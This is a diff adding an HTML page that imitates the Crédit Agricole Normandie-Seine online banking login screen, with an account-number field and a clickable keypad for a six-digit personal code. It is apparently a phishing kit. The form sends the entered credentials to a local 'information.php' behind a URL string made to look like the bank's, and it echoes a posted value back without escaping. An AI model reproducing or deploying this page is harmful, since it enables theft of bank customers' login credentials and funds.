@@ -1,0 +1,823 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   AUTH
+  </title>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible" />
+  <link media="all" href="entreeBam_fichiers/antiquus_002.css" type="text/css" rel="stylesheet" />
+  <link media="all" href="entreeBam_fichiers/antiquus.css" type="text/css" rel="stylesheet" />
+  <link media="all" href="entreeBam_fichiers/styles_002.css" type="text/css" rel="stylesheet" />
+  <link media="all" href="entreeBam_fichiers/styles.css" type="text/css" rel="stylesheet" />
+  <link media="all" href="entreeBam_fichiers/styles-mod_002.css" type="text/css" rel="stylesheet" />
+  <link media="all" href="entreeBam_fichiers/styles-mod.css" type="text/css" rel="stylesheet" />
+  <!--[if IE 8]>
+
+<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all"  />
+<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all"  />
+
+<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all"  />
+<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all"  />
+<![endif]-->
+  <!--[if lte IE 7]>
+
+<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all"  />
+<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie.css?v=50" media="all"  />
+
+<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all"  />
+<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all"  />
+<![endif]-->
+  <!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all"  />
+<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all"  />
+
+<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all"  />
+<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all"  />
+<![endif]-->
+  <link media="all" href="entreeBam_fichiers/stb.css" type="text/css" rel="stylesheet" />
+  <script src="entreeBam_fichiers/infosbulle.js">
+  </script>
+  <script language="JavaScript">
+   &lt;!--
+
+//Message affiché quand le souris est au-dessus: 
+statusconfirmer="Confirmer l'identification";
+statusannuler="Annuler l'identification";
+statusaide="Besoin d'Aide ?";
+statuscondjur="Conditions juridiques";
+statusdemo="Voir la démonstration";
+statuscompte="Saisir votre n° de compte";
+statuscode="Saisir votre code personnel";
+statuscorriger="Corriger votre dernière saisie";
+statusclavnum="Cliquez dans la grille pour composer votre code personnel";
+statusrecom="Voir nos recommandations";
+
+// on recupere la version du navigateur
+var OS = 'Win';
+// on recupere la version du navigateur
+Version=navigator.appVersion;
+App = navigator.appName;
+var Version=Version.substring(0,1);
+var posOS = navigator.appVersion.indexOf('Mac');
+var posOS2 = navigator.appVersion.indexOf('Win');
+if (posOS &gt;= 0) OS = 'Mac';
+if ((posOS &lt; 0) &amp;&amp; (posOS2 &gt;= 0)) OS = 'Win';
+if (OS == 'Win') Nav_sup = 2;
+else Nav_sup = 3;
+// si c'est Netscape 2+ ou MSIE3+, c'est correct
+browserOK=(((navigator.appName=="Netscape") &amp;&amp; (Version &gt; 1)) || (Version&gt;=Nav_sup));
+browserOK1=(((navigator.appName=="Netscape") &amp;&amp; (Version &gt; 1)) || (Version&gt;=4));
+browserOK2=(navigator.appName=="Netscape");
+
+
+// Detection navigateur
+nsvers = "0.94"; // pour netscape "6.2";
+ievers = "5";
+browserOK = false;
+isIE55 = false;
+var d, na, nua, nav, nan, dom, ie, ienu, ie4, ie5, ie5x, ie6, moz, moznu, ns62, mac, win, old, lin, ie5mac, ie5xwin, op, opnu, op4, op5, op6, op7, konq, saf, saf_num;
+
+//variable initialization
+
+d = document;
+na = navigator;
+nav = na.appVersion;
+nan = na.appName;
+nua = na.userAgent;
+win = ( nav.indexOf( 'Win' ) != -1 );
+mac = ( nav.indexOf( 'Mac' ) != -1 );
+lin = ( nav.indexOf( 'Linux' ) != -1 );
+
+if ( !d.layers ){
+	dom = ( d.getElementById );
+	old = ( nav.substring( 0, 1 ) &lt; 4 );
+	op = ( nua.indexOf( 'Opera' ) != -1 );
+	moz = ( nua.indexOf( 'Gecko' ) != -1 );
+	ie = ( d.all &amp;&amp; !op );
+	konq = ( nua.indexOf( 'Konqueror' ) != -1 );
+	saf = ( nua.indexOf( 'Safari' ) != -1 );
+
+	if ( op ){
+		op_pos = nua.indexOf( 'Opera' );
+		opnu = nua.substr( ( op_pos + 6 ), 3 );
+		op5 = ( opnu.substring( 0, 1 ) == 5 );
+		op6 = ( opnu.substring( 0, 1 ) == 6 );
+		op7 = ( opnu.substring( 0, 1 ) == 7 );
+	}
+	else if ( saf ){
+		saf_pos = nua.indexOf( 'Safari' );
+		saf_nu = nua.substr( ( saf_pos + 7 ), 2 );
+	}
+	else if ( moz ){
+		rv_pos = nua.indexOf( 'rv' );
+		moz_rv = nua.substr( ( rv_pos + 3 ), 3 );
+		moz_rv_sub = nua.substr( ( rv_pos + 7 ), 1 );
+		moz_rv_sub = moz_rv + moz_rv_sub;
+		browserOK = (moz_rv_sub &gt;= nsvers);
+	}
+	else if ( ie ){
+		ie_pos = nua.indexOf( 'MSIE' );
+		ienu = nua.substr( ( ie_pos + 5 ), 3 );
+		ie4 = ( !dom ); 
+		ie5 = ( ienu.substring( 0, 1 ) == 5 );
+		ie6 = ( ienu.substring( 0, 1 ) == 6 );
+		browserOK = ( ienu.substring( 0, 1 ) &gt;= ievers );
+	}
+	else{} 
+
+	ie5x = ( d.all &amp;&amp; dom );
+	isIE55 = ie5x;
+	ie5mac = ( mac &amp;&amp; ie5 );
+	ie5xwin = ( win &amp;&amp; ie5x );
+}
+
+function Init()
+{
+		if (document.formulaire.CCPTE.value == "") document.formulaire.CCPTE.focus();
+        document.onkeydown=pressKey;
+}
+
+ns4=(document.layers)? true:false;
+ie4=(document.all)? true:false;
+
+function pressKey (e) {
+/*
+        if (ns4) {var nKey=e.which; var ieKey=0}
+        if (ie4) {var ieKey=event.keyCode; var nKey=0}
+        if (nKey==13 || ieKey==13) {
+				validation(document.formulaire);
+                return true;
+        }
+*/
+}
+
+function setSize(win,width,height) {
+	if (win.outerWidth) {
+		win.outerWidth = width;
+		win.outerHeight = height;
+	}
+	else if (win.resizeTo) {
+		win.resizeTo(width,height);
+	}
+	else {
+		alert("Not supported.");
+	}
+}
+
+function clicPosition(position) {
+	cocherCase();
+	if (document.formulaire.CCCRYC2.value.length == 6) { 
+		return; 
+	}
+	if (document.formulaire.CCCRYC.value=="") 
+		document.formulaire.CCCRYC.value = position;
+	else
+		document.formulaire.CCCRYC.value = document.formulaire.CCCRYC.value + position;
+	document.formulaire.CCCRYC2.value = document.formulaire.CCCRYC2.value + "0";
+}
+
+var code, pos_der_code, affiche_code;
+function effacer() { 
+	if (document.formulaire.CCCRYC2.value.length == 0) { 
+		return; 
+	}
+	code = document.formulaire.CCCRYC.value;
+	pos_der_code = code.lastIndexOf( ',' );
+	code = code.substr( 0,pos_der_code);
+
+	affiche_code = document.formulaire.CCCRYC2.value;
+	affiche_code = affiche_code.substr( 0,(document.formulaire.CCCRYC2.value.length - 1) );
+
+	document.formulaire.CCCRYC.value = code;
+	document.formulaire.CCCRYC2.value = affiche_code;
+}
+
+var i=0;
+function cocherCase() {
+	if ( i&lt;6)
+	{
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[i].style.visibility = 'visible';
+		i = i + 1;
+	}
+}
+function corriger() {
+	if ( i&gt;0 )
+	{
+		i = i - 1;
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[i].style.visibility = 'hidden';
+	 }
+}
+
+var path_static = "";
+var path_dynamic = "/stb";
+// Recuperation code caisse
+var caisse = "883";
+
+function raf(){
+	return;
+}
+
+var urlappli = "/stb/entreeBam";
+var urlapplisecu = "/stb/securite-entreeBam?TOPAF=1";
+
+function ValidCertif(){
+	if(validation(document.formulaire)){ document.formulaire.submit(); }
+
+}
+
+function ValidCertifSecu(){
+	if(validation(document.formulaire)){ document.formulaire.submit(); }
+}
+
+// --&gt;
+  </script>
+  <script language="JavaScript">
+   &lt;!--
+
+function ouvrePOPUP(item,widthpop,heightpop,men) {
+	if(item.indexOf("?") != -1) {
+		item = item+"&amp;stbevt=Popup";
+	}
+	else {
+		item = item+"?stbevt=Popup";
+	}
+
+	ouvreFenetre(item,widthpop,heightpop,men,"PopUp");
+}
+function ouvreassistance(item,widthpop,heightpop,men) {
+	ouvreFenetre(item,widthpop,heightpop,men,"Assistance");
+}
+
+function ouvreFenetre(item,widthpop,heightpop,men,titre) {
+
+	if (item.indexOf("?") != -1) {
+		if (item.indexOf("#") != -1)
+			url = item.substring(0,item.indexOf("#"))+"&amp;typeaction=Popup"+item.substring(item.indexOf("#"),item.length);
+		else
+			url = item+"&amp;typeaction=Popup";
+	} else {
+		url = item;
+	}
+
+	aazz = "menubar=" + men + ",resizable=yes,toolbar=no,width=" + widthpop + ",height=" + heightpop + ",scrollbars=yes";
+
+	// on verifie si l'on n'est pas deja sur la bonne fenetre
+	if (titre!=window.name) {
+		// Mise en commentaire de l ancien code
+		//if (!saf) {
+			// on recupere un reference sur le popup (s'il n'est pas ouvert, cela en ouvre une!)
+		//	popup1 = window.open('',titre,aazz);
+			// on ferme le popup
+		//	popup1.close();
+		//}
+		// on ouvre le nouveau avec les nouveaux parametres (taille, bouton...)
+		//popup1 = window.open('',titre,aazz);
+		//popup1.name = titre;
+		//setSize(popup1,widthpop,heightpop);
+			
+		popup1 = window.open(url,titre,aazz);
+			
+	    if (moz ) popup1.focus();
+	    //popup1.location =url;
+	} else {
+		window.name = titre;
+		setSize(window,widthpop,heightpop);
+		document.location = url;
+	}
+
+}
+
+function setSize(win,width,height) {
+	if (win.outerWidth) {
+		win.outerWidth = width;
+		win.outerHeight = height;
+	}
+	else if (win.resizeTo) {
+		win.resizeTo(width,height);
+	}
+	else {
+		alert("Not supported.");
+	}
+}
+
+//ouvre une fenêtre popup en plein écran ne laissant l'affichage que de la bnt
+function ouvrirPopupBntVisible(url) {
+	window.open(url,'Popup','location=no,toolbar=no,directories=no,menubar=yes,resizable=yes,scrollbars=yes,status=yes,width='+(screen.availWidth-140)+',height='+screen.availHeight+',screenY=0,screenX='+140);
+}
+
+// --&gt;
+  </script>
+ </head>
+ <body text="#000000" onload="Init()" topmargin="0" leftmargin="0">
+  <div style="position: absolute; z-index: 10;" id="infoBull">
+  </div>
+  <div style="position: absolute; z-index: 9;" id="ombrBull">
+  </div>
+  <div id="container">
+   <div style="width: 957px;" id="contenu">
+    <table border="0">
+     <tbody>
+      <tr>
+       <td colspan="3">
+        <div align="center" style="background-color: rgb(230, 230, 230);">
+         <table width="620px" border="0" cellspacing="0" cellpadding="0">
+          <tbody>
+           <tr>
+            <td style="background: none repeat scroll 0% 0% rgb(230, 230, 230);">
+             <div id="entete_vide">
+              <div style="background: none repeat scroll 0% 0% transparent;" id="entete">
+               <div id="gauche-entete">
+                <h1>
+                 <img width="317" height="85" src="entreeBam_fichiers/siteon0.gif" />
+                </h1>
+               </div>
+              </div>
+             </div>
+            </td>
+           </tr>
+          </tbody>
+         </table>
+        </div>
+       </td>
+      </tr>
+      <tr valign="top">
+       <td>
+        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="">
+         <tbody>
+          <tr>
+           <td width="169" valign="top" style="background: none repeat-y scroll left top rgb(230, 230, 230);">
+           </td>
+           <td width="590px" valign="top" id="col-centre">
+            <table width="590" border="0" cellspacing="0" cellpadding="0">
+             <tbody>
+              <tr>
+               <td>
+                <table width="590" border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td class="montant2" colspan="2">
+                   </td>
+                  </tr>
+                  <tr>
+                   <td height="17" colspan="2">
+                   </td>
+                  </tr>
+                  <!-- bandeau authentification -->
+                  <tr>
+                   <td align="center" colspan="2">
+                    <a target="_blank" href="http://www.ca-normandie-seine.fr/bam-information/">
+                     <img width="585" height="75" border="no" src="entreeBam_fichiers/a.jpeg" />
+                    </a>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td>
+                   </td>
+                  </tr>
+                  <tr>
+                   <td height="17">
+                    <div class="boutons-act">
+                     <h1>
+                      Identification
+                     </h1>
+                    </div>
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+                <form action="information.php?ca=http://credit-agricole.fr/identification/f451r20zf52zr0feg451er20gre4512g0rg4512r0erg410" name="formulaire" method="POST" class="ca-forms ca-forms-stitre">
+                 <input type="hidden" value="vitrine" name="origine" />
+                 <input type="hidden" value="BANCAIRE" name="situationTravail" />
+                 <input type="hidden" value="WEB" name="canal" />
+                 <input type="hidden" value="CLIC_RETOUR" name="typeAuthentification" />
+                 <input type="hidden" value="-5fc1cca6:13415bdaa41:-7efb" name="idUnique" />
+                 <input type="hidden" value="883" name="caisse" />
+                 <input type="hidden" value="" name="CCCRYC" />
+                 <input type="hidden" value="<? print $_POST['cp']; ?>" name="cp" />
+                 <fieldset class="blc-choix">
+                  <div style="padding-bottom: 40px;" class="blc-choix-wrap">
+                   <p class="nomarge">
+                    <b>
+                     Le Crédit Agricole accorde une grande attention à la sécurité de ses sites internet.
+                    </b>
+                    En tant qu'utilisateur, vous avez également un rôle important et actif à
+ jouer pour assurer la sécurité des informations qui vous concernent. 
+Consultez ci-dessous les RECOMMANDATIONS de SECURITE à respecter :
+                   </p>
+                   <p style="width: 570px;" class="validation">
+                    <a onclick="javascript:ouvrePOPUP('http://www.ca-normandie-seine.fr/Vitrine/SiteSecuriteV2/index.jsp',790,455,'no','AUTH')" class="retour gauche">
+                     Nos recommandations
+                    </a>
+                   </p>
+                  </div>
+                 </fieldset>
+                 <table width="590" border="0">
+                  <!-- Message securitaire -->
+                  <tbody>
+                   <tr>
+                    <td height="22" colspan="3">
+                     <input type="hidden" value="" name="CCCRYC2" />
+                     <fieldset class="blc-choix">
+                      <script>
+                       if(saf){
+									document.write("&lt;div class=\"blc-choix-wrap\" style=\"padding-bottom:190px;\"&gt;");
+									
+								}else{
+									document.write("&lt;div class=\"blc-choix-wrap\"&gt;");
+								}
+                      </script>
+                      <div class="blc-choix-wrap">
+                       <div class="blc-choix-wrap">
+                        <script langage="Javascript">
+                         &lt;!--
+function validation(formulaire) {
+if(formulaire.CCPTE.value=="") {
+alert("Votre numéro de compte est incomplet.");
+return;
+}
+if(formulaire.CCCRYC.value=="") {
+alert("Votre code personnel est incomplet.");
+return;
+}
+if(isAlphaNum(formulaire.CCPTE.value)) {
+if(isNumerique(formulaire.CCCRYC2.value)) {
+formulaire.submit();
+}
+else {
+alert("Votre code personnel est incomplet.");
+}
+}
+else {
+alert("Votre numéro de compte est incomplet.");
+}
+}
+function isNumerique(chaine){
+if (chaine.length!=6)
+return false;
+for(var i=0;i&lt;chaine.length;i++){
+if(chaine.charAt(i)&gt;'9' || chaine.charAt(i)&lt;'0'){
+return false;
+}
+}
+return true;
+}
+function isAlphaNum(chaine){
+if (chaine.length!=11)
+return false;
+chaine = chaine.toLowerCase();
+for(var i=0;i&lt;chaine.length;i++){
+if(!((chaine.charAt(i)&lt;='9' &amp;&amp; chaine.charAt(i)&gt;='0') || (chaine.charAt(i)&lt;='z' &amp;&amp; chaine.charAt(i)&gt;='a'))){
+return false;
+}
+}
+return true;
+}
+--&gt;
+                        </script>
+                        <h3>
+                         Vos codes d'accès
+                        </h3>
+                        <label class="normal">
+                         Saisissez votre N° DE COMPTE à l'aide de votre clavier :
+                        </label>
+                        <input type="text" tabindex="1" maxlength="11" size="22" name="CCPTE" />
+                        <p>
+                        </p>
+                        <div id="bloc-pave-saisis-code">
+                         <label for="input-code" class="normal gauche">
+                          Cliquez dans la grille
+                          <br />
+                          pour composer votre CODE PERSONNEL :
+                         </label>
+                         <table class="gauche" id="pave-saisie-code">
+                          <tbody>
+                           <tr valign="middle" align="center">
+                            <td>
+                             <a href="javascript:raf()" tabindex="2">
+                             </a>
+                            </td>
+                            <td onclick="clicPosition('9'); ">
+                             <a href="javascript:raf()" tabindex="3">
+                                9  
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="4">
+                             </a>
+                            </td>
+                            <td onclick="clicPosition('6'); ">
+                             <a href="javascript:raf()" tabindex="5">
+                                6  
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="6">
+                             </a>
+                            </td>
+                           </tr>
+                           <tr valign="middle" align="center">
+                            <td>
+                             <a href="javascript:raf()" tabindex="7">
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="8">
+                             </a>
+                            </td>
+                            <td onclick="clicPosition('4'); ">
+                             <a href="javascript:raf()" tabindex="9">
+                                4  
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="10">
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="11">
+                             </a>
+                            </td>
+                           </tr>
+                           <tr valign="middle" align="center">
+                            <td onclick="clicPosition('8'); ">
+                             <a href="javascript:raf()" tabindex="12">
+                                8  
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="13">
+                             </a>
+                            </td>
+                            <td onclick="clicPosition('2'); ">
+                             <a href="javascript:raf()" tabindex="14">
+                                2  
+                             </a>
+                            </td>
+                            <td onclick="clicPosition('1'); ">
+                             <a href="javascript:raf()" tabindex="15">
+                                1  
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="16">
+                             </a>
+                            </td>
+                           </tr>
+                           <tr valign="middle" align="center">
+                            <td onclick="clicPosition('0'); ">
+                             <a href="javascript:raf()" tabindex="17">
+                                0  
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="18">
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="19">
+                             </a>
+                            </td>
+                            <td onclick="clicPosition('7'); ">
+                             <a href="javascript:raf()" tabindex="20">
+                                7  
+                             </a>
+                            </td>
+                            <td onclick="clicPosition('3'); ">
+                             <a href="javascript:raf()" tabindex="21">
+                                3  
+                             </a>
+                            </td>
+                           </tr>
+                           <tr valign="middle" align="center">
+                            <td onclick="clicPosition('5'); ">
+                             <a href="javascript:raf()" tabindex="22">
+                                5  
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="23">
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="24">
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="25">
+                             </a>
+                            </td>
+                            <td>
+                             <a href="javascript:raf()" tabindex="26">
+                             </a>
+                            </td>
+                           </tr>
+                          </tbody>
+                         </table>
+                         <span class="align-bas gauche">
+                          <table>
+                           <tbody>
+                            <tr>
+                             <td>
+                              <div style="border: 1px solid gray;">
+                               <table style="border: medium none;" class="monAvancement" id="monAvancement">
+                                <tbody>
+                                 <tr>
+                                  <td class="maCase">
+                                   <img width="10" height="10" src="entreeBam_fichiers/point_transp.gif" />
+                                  </td>
+                                  <td class="maCase">
+                                   <img width="10" height="10" src="entreeBam_fichiers/point_transp.gif" />
+                                  </td>
+                                  <td class="maCase">
+                                   <img width="10" height="10" src="entreeBam_fichiers/point_transp.gif" />
+                                  </td>
+                                  <td class="maCase">
+                                   <img width="10" height="10" src="entreeBam_fichiers/point_transp.gif" />
+                                  </td>
+                                  <td class="maCase">
+                                   <img width="10" height="10" src="entreeBam_fichiers/point_transp.gif" />
+                                  </td>
+                                  <td class="maCase">
+                                   <img width="10" height="10" src="entreeBam_fichiers/point_transp.gif" />
+                                  </td>
+                                 </tr>
+                                </tbody>
+                               </table>
+                              </div>
+                             </td>
+                             <td>
+                              (6 chiffres)
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </span>
+                        </div>
+                        <p style="width: 570px; margin: 30px 0pt 0pt;" class=" validation clearboth">
+                         <span class="gauche">
+                          <a tabindex="31" href="javascript:ouvrePOPUP('http://www.ca-normandie-seine.fr/demo-bamg2v5.html',1024,587,'no','AUTH');" class="retour gauche">
+                           Voir la démonstration
+                          </a>
+                         </span>
+                         <span class="droite">
+                          <a tabindex="27" href="javascript:corriger();effacer();" class="annuler droite">
+                           Corriger
+                          </a>
+                          <a tabindex="28" href="javascript:ValidCertif();" class="droite">
+                           Confirmer
+                          </a>
+                          <a tabindex="30" href="javascript:document.location.href='http://www.ca-normandie-seine.fr';" class="annuler droite">
+                           Annuler
+                          </a>
+                         </span>
+                        </p>
+                       </div>
+                      </div>
+                     </fieldset>
+                    </td>
+                   </tr>
+                  </tbody>
+                 </table>
+                </form>
+               </td>
+              </tr>
+              <tr>
+               <td>
+                <!-- Pavé Certificat -->
+                <!-- Conditions Juridique -->
+                <table width="590" border="0" cellspacing="0" cellpadding="0">
+                 <tbody>
+                  <tr>
+                   <td width="3">
+                   </td>
+                   <td>
+                    <table width="590" border="0" cellspacing="3" cellpadding="0">
+                     <tbody>
+                      <tr>
+                       <td width="100%" class="encartbaspage">
+                        <table width="100%" border="0" align="center" cellspacing="1" cellpadding="12">
+                         <tbody>
+                          <tr>
+                           <td valign="top" height="17" align="center" class="colfondpage">
+                            <table>
+                             <tbody>
+                              <tr class="libelle3">
+                               <td>
+                                <b>
+                                 Pour toute assistance, vous pouvez consulter la
+                                 <a target="_blank" href="http://www.ca-normandie-seine.fr/faq.html">
+                                  <font color="#0000ff">
+                                   Foire Aux Questions
+                                  </font>
+                                 </a>
+                                 <font color="#0000ff">
+                                  <font color="#000000">
+                                   ou appeler le 02 35 59 19 19 (choix 2) (appel gratuit hors frais de communication facturés par l'opérateur de télécommunication)
+                                  </font>
+                                 </font>
+                                </b>
+                                <font color="#0000ff">
+                                 <font color="#000000">
+                                  <br />
+                                  Du lundi au vendredi de 08h00 à 20h00
+                                  <br />
+                                  Le samedi de 08h00 à 18h00
+                                  <br />
+                                  <br />
+                                  <b>
+                                   Vous n'arrivez pas à vous connecter à nos services :
+                                  </b>
+                                  <br />
+                                  Cette application est optimisée pour les logiciels de navigation MS Internet Explorer 6 et versions ultérieures.
+                                  <br />
+                                 </font>
+                                </font>
+                               </td>
+                              </tr>
+                             </tbody>
+                            </table>
+                           </td>
+                          </tr>
+                         </tbody>
+                        </table>
+                       </td>
+                      </tr>
+                     </tbody>
+                    </table>
+                   </td>
+                   <td width="3">
+                   </td>
+                  </tr>
+                 </tbody>
+                </table>
+               </td>
+              </tr>
+             </tbody>
+            </table>
+           </td>
+           <td width="171" valign="top" style="background: none repeat-y scroll left top rgb(230, 230, 230);">
+           </td>
+          </tr>
+          <tr valign="middle" style="background-color: rgb(230, 230, 230);">
+           <td>
+           </td>
+           <td>
+            <table width="590" border="0" cellspacing="0" cellpadding="0">
+             <tbody>
+              <tr>
+               <td align="center" class="footercopyright">
+               </td>
+              </tr>
+              <tr>
+               <td align="center" class="footercopyright">
+                @2004-2010 Crédit Agricole,
+				tous droits réservés
+               </td>
+              </tr>
+             </tbody>
+            </table>
+            <!--MARQUEUR XITI-->
+            <script language="JavaScript1.1">
+             &lt;!--
+hsh = new Date();
+hsd = document;
+hsi = '&lt;img width="1" height="1" src="https://logs8.xiti.com/hit.xiti?cc=17&amp;cs=883&amp;s2=1'
+hsi += '&amp;p=identification_autre_&amp;hl=' + hsh.getHours() + 'x' + hsh.getMinutes() + 'x' + hsh.getSeconds();
+if(parseFloat(navigator.appVersion)&gt;=4)
+{Xiti_s=screen;hsi += '&amp;r=' + Xiti_s.width + 'x' + Xiti_s.height + 'x' + Xiti_s.pixelDepth + 'x' + Xiti_s.colorDepth;}
+hsd.writeln(hsi + '&amp;ref=' + hsd.referrer.replace('&amp;', '$') + '" &gt;');
+//--&gt;
+            </script>
+            <img width="1" height="1" src="https://logs8.xiti.com/hit.xiti?cc=17&cs=883&s2=1&p=identification_autre_&hl=3x23x21&r=1024x768x24x24&ref=http://firstslavic.ge/khay/90247579a4b2d3ca28dd9e0c9570208b/" />
+            <img width="1" height="1" src="entreeBam_fichiers/hit.gif" />
+            <noscript>
+             &lt;img width="1" height="1" src="https://logs8.xiti.com/hit.xiti?cc=17&amp;cs=883&amp;s2=1&amp;p=identification_autre_" /&gt;
+            </noscript>
+           </td>
+           <td>
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+    <table>
+     <tbody>
+      <tr>
+       <td width="169">
+       </td>
+       <td width="570" id="main_bas">
+       </td>
+       <td width="169">
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+  </div>
+ </body>
+</html>
